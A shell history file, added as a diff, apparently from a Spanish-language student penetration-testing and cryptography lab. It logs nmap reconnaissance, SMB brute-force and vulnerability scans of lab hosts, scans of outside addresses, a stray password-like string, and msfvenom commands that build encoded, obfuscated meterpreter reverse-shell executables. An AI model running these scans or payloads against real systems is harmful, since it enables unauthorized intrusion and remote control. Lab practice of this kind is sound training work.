@@ -1,0 +1,264 @@
+──(kali㉿kali)-[~]
+└─$ history
+    1  setxkbmap latam
+    2  clear
+    3  sudo apt update && sudo apt install openssl -y
+    4  clear
+    5  poweroff
+    6  nmap -PR 45.33.32.0/24
+    7  clear
+    8  exit
+    9  clear
+   10  ls
+   11  nmap --version
+   12  cl
+   13  clear
+   14  ipconfic
+   15  ipconfig
+   16  clear
+   17  ip a
+   18  nmap -sP 192.168.147.0/24
+   19  nmap -sP 45.33.32.0/24
+   20  nmap scanme.nmap.org
+   21  clear
+   22  nmap 192.168.147.130
+   23  nmap 192.168.147.131
+   24  nmap -sn -PM 192.168.147.131
+   25  nmap -sn -PS 192.168.147.131
+   26  nmap -sn -PY 192.168.147.131
+   27  history
+   28  setxkbmap latam
+   29  nmap -sn -traceroute instagram.com
+   30  nmap -6 google.com
+   31  clear
+   32  nmap -6 google.com
+   33  nmap -PR 192.168.147.131
+   34  histrory
+   35  history
+   36  nmap -sP 192.168.147.0/24\n
+   37  nmap -PR 192.168.147.129
+   38  nmap -PU53 192,168.147.131
+   39  nmap -PU53 192,168.147.130
+   40  clear
+   41  nmap -p 1-500 192.168.147.131 -oN output.txt
+   42  cat output.txt
+   43  nmap -p 1-500 192.168.147.131 -oN output.xml
+   44  cat output.xml
+   45  nmap -p 1-500 192.168.147.131 -oX output.xml
+   46  cat output.xml
+   47  claer
+   48  clear
+   49  poweroff
+   50  nslookup
+   51  exit
+   52  setxkbmap latam
+   53  clear
+   54  ipconfig
+   55  nmap -p 139 192.168.147.131
+   56  nmap -p 139 192.168.147.130
+   57  clear
+   58  nmap -p 139 192.168.147.131
+   59  nmap -p 135 192.168.147.130
+   60  nmap -p ssh 192.168.147.130
+   61  nmap -p ssh 192.168.147.131
+   62  nmap -sS -p 100-500 192.168.147.131 --exclude-ports 139
+   63  nmap -sS -p 100-500 192.168.147.130
+   64  nmap -sV 192.168.147.130
+   65  nmap -sV 192.168.147.131
+   66  nmap -sV 45. 
+   67  nmap -sV 45.33.32.156
+   68  clear
+   69  nmap -sV --script http-malware-host 192.168.147.130
+   70  nmap -sV --script http-malware-host 192.168.147.131
+   71  clear
+   72  exit
+   73  nmap --script smb-brute --script-args smbtype=v2
+   74  nmap --script smb-brute --script-args smbtype=v2 192.168.147.130
+   75  clear
+   76  exit
+   77  ^[[200~
+   78  Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 10:44 -0400
+   79  nmap -f --script "mysql-*" -p 3306 192.168.147.131
+   80  nmap -f --script vuln 192.168.147.130
+   81  clearexiot
+   82  exit
+   83  nmap -O 192.168.147.131
+   84  nmap -O 192.168.147.130
+   85  nmap -O -v 192.168.147.130
+   86  nmap -O -v 192.168.147.131
+   87  nmap -sU -p 161 192.168.147.130
+   88  nmap -sU -p 161 192.168.147.131
+   89  nmap -sU -p 161 45.33.32.
+   90  nmap -sU -p 161 45.33.32.156
+   91  clear
+   92  nmap -sU -p 161 192.168.147.130
+   93  nmap -sU -p 161 192.168.147.131
+   94  nmap -sU -p 161 45.33.32.156
+   95  nmap -sV -version-trace 192.168.147.131
+   96  nmap -sV -version-trace 192.168.147.130
+   97  nmap -f 182.168.147.130
+   98  clear
+   99  nmap -f 192.168.147.130
+  100  nmap -f 192.168.147.131
+  101  Nmap -g 80 192.168.147.1
+  102  Nmap -g 80 192.168.147.130
+  103  clear
+  104  nmap -g 80 192.168.147.130
+  105  nmap -g 80 192.168.147.131
+  106  nmap -mtu 8 192.168.147.130
+  107  nmap -mtu 8 192.168.147.131
+  108  nmap --date-length 5 192.168.147.130
+  109  nmap --date-length 5 192.168.147.131
+  110  nmap -date-length 5 192.168.147.131
+  111  nmap --daae-length 5 192.168.147.131
+  112  nmap --data-length 5 192.168.147.131
+  113  nmap --data-length 5 192.168.147.130
+  114  clear
+  115  nmap --script-updatedb
+  116  sudo nmap --script-updateddb
+  117  sudo nmap --script-updatedb
+  118  clear
+  119  sudo nmap --script-updatedb
+  120  nmap -f --script safe 192.168.147.130
+  121  nmap -f --script-safe 192.168.147.130
+  122  nmap -f --script safe 192.168.147.130
+  123  clear
+  124  nmap -f --script safe 192.168.147.131
+  125  clear
+  126  ip
+  127  ip address
+  128  ip a
+  129  nmap -sP 192.168.147.0/24
+  130  clear
+  131  nmap --script smb-os-discovery.nse 192.168.147.130
+  132  nmap --script smb-os-discovery.nse 192.168.147.131
+  133  nmap --script smb-enum-shares.nse -p445 192.168.147.130
+  134  nmap --script smb-enum-shares.nse -p445 192.168.147.131
+  135  nmap --script smb-enum-users.nse 192.168.147.130
+  136  nmap --script smb-enum-users.nse 192.168.147.131
+  137  nmap -f -sV -sS --script auth 192.168.147.130
+  138  nmap -f -sS -sV --script auth 192.168.147.130
+  139  nmap -f -sS -sV --script auth 192.168.147.131
+  140  nmap --script smb-security-mode 192.168.147.130
+  141  nmap --script smb-security-mode 192.168.147.131
+  142  nmap --script smb-brute --script-args smbtype=v2 192.168.147.131
+  143  clear
+  144  nmap --script smb-brute --script-args smbtype=v2 192.168.147.130
+  145  nmap --script smb-brute --script-args smbtype=v2 192.168.147.131
+  146  clear
+  147  nmap --script smb-brute --script-args smbtype=v1 192.168.147.130
+  148  nmap --script smb-brute --script-args smbtype=v2 192.168.147.131
+  149  nmap -f --script "mysql-*" -p 192.168.147.130
+  150  nmap -f --script "mysql-*" -p 192.168.147.131
+  151  nmap -f --script "mysql-*" -p 3306 192.168.147.130
+  152  nmap -f --script vuln 192.168.147.131
+  153  clear
+  154  sudo apt update && sudo apt install openssl -y
+  155  \topenssl genpkey -algorithm RSA -out clave_privada.pem -aes256
+  156  cleear
+  157  clear
+  158  openssl genpkey -algorithm RSA -out clave_privada.pem -aes256
+  159  openssl rsa -pubout -in clave_privada.pem -out clave_publica.pem
+  160  clear
+  161  X^-o#09MCK?22F./}L
+  162  openssl rsa -pubout -in clave_privada.pem -out clave_publica.pem
+  163  cat clave_publica.pem
+  164  clear
+  165  cat clave_publica.pem
+  166  echo "Vamos a echarle huevos a esta practica. Se supone esto es confidencial." > secreto.txt
+  167  clear
+  168  echo "Este archivo contiene información confidencial del laboratorio." > secreto.txt
+  169  openclear
+  170  clear
+  171  openssl pkeyutl -encrypt -pubin -inkey clave_publica.pem -in secreto.txt -out\nsecreto_cifrado.bin
+  172  clear
+  173  openssl pkeyutl -encrypt -pubin -inkey clave_publica.pem -in secreto.txt -out secreto_cifrado.bin
+  174  clear
+  175  openssl pkeyutl -decrypt -inkey clave_privada.pem -in secreto_cifrado.bin -out secreto_descifrado.txt
+  176  clear
+  177  openssl rsa -pubout -in clave_privada.pem -out clave_publica.pem
+  178  openssl pkeyutl -decrypt -inkey clave_privada.pem -in secreto_cifrado.bin -out secreto_descifrado.txt
+  179  clear
+  180  diff secreto.txt secreto_descifrado.txt
+  181  clear
+  182  echo "Este archivo contiene información confidencial del laboratorio." > secreto.txt
+  183  openssl pkeyutl -encrypt -pubin -inkey clave_publica.pem -in secreto.txt -out secreto_cifrado.bin
+  184  openssl pkeyutl -decrypt -inkey clave_privada.pem -in secreto_cifrado.bin -out secreto_descifrado.txt
+  185  diff secreto.txt secreto_descifrado.txt
+  186  clear
+  187  openssl enc -aes-256-cbc -salt -in secreto.txt -out secreto_aes.enc~
+  188  openssl enc -aes-256-cbc -salt -pbkdf2 -in secreto.txt -out secreto_aes.enc
+  189  openssl enc -d -aes-256-cbc -pbkdf2 -in secreto_aes.enc -out secreto_aes_dec.txt
+  190  diff secreto.txt secreto_aes_dec.txt
+  191  clear
+  192  openssl dgst -sha256 secreto.txt
+  193  openssl dgst -sha256 secreto_descifrado.txt
+  194  clear
+  195  openssl dgst -sha256 -sign clave_privada.pem -out firma_secreto.bin secreto.txt
+  196  clear
+  197  openssl dgst -sha256 -sign clave_privada.pem -out firma_secreto.bin secreto.txt
+  198  openssl dgst -sha256 -verify clave_publica.pem -signature firma_secreto.bin secreto.txt
+  199  poweroff
+  200  nmap --script smb-os-discovery.nse 192.168.147.130
+  201  nmap --script smb-os-discovery.nse 192.168.147.131
+  202  ip
+  203  clear
+  204  nmap --script smb-os-discovery.nse 192.168.147.130
+  205  telnet 192.168.147.130 445
+  206  setxkbmap latam
+  207  exit
+  208  history
+  209  exit
+  210  msfconsole
+  211  exit
+  212  nmap --script smb-security-mode 192.168.147.131
+  213  nmap --script smb-security-mode 192.168.147.130
+  214  nmap --script smb-brute --script-args smbtype=v1 192.168.147.130
+  215  nmap --script smb-brute --script-args smbtype=v2 192.168.147.131
+  216  nmap --script smb-brute --script-args smbtype=v1 192.168.147.130
+  217  nmap -f -sV -sS --script auth 192.168.147.130
+  218  nmap -f -sV -sS --script auth 192.168.147.131
+  219  clear
+  220  nmap -sV --script vuln 192.168.147.130
+  221  exitr
+  222  exit
+  223  telnet 192.168.147.130 6200
+  224  telnet 192.168.147.130 80
+  225  clear
+  226  nmap -sV --script vuln 192.168.147.131
+  227  ip a
+  228  nmap 192.168.147.024
+  229  nmap 192.168.147.0/24
+  230  poweroff
+  231  exit
+  232  recon-ng 
+  233  nmap -sV 18.164.116.56
+  234  cat http://amazon.com.mx:80/robots.txt
+  235  wget http://amazon.com.mx:80/robots.txt
+  236  cat robot.txt
+  237  cat robots.txt
+  238  history
+  239  nmap -sV 192.168.147.0/24
+  240  ipconfig
+  241  ip
+  242  ip addr
+  243  exit
+  244  msfvenom--help
+  245  msfvenom --help
+  246  msfvenom --list payloads
+  247  msfvenom --list encoders
+  248  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -f exe payload.exe
+  249  la
+  250  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -f exe > payload.exe
+  251  ls
+  252  clear
+  253  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -e x64/xor -f  exe > payloadCodificado.exe
+  254  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -e x64/xor -i 10 -f  exe > payloadCodificado.exe
+  255  ls
+  256  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.147.129 LPORT=4444 -e x64/xor -i 10 --encrypt xor --encrypt-key "123456" -f exe > payloadOfuscado.exe
+  257  ls
+  258  claer
+  259  clear
+  260  msfconsole
+  261  exit
+  262  poweroff
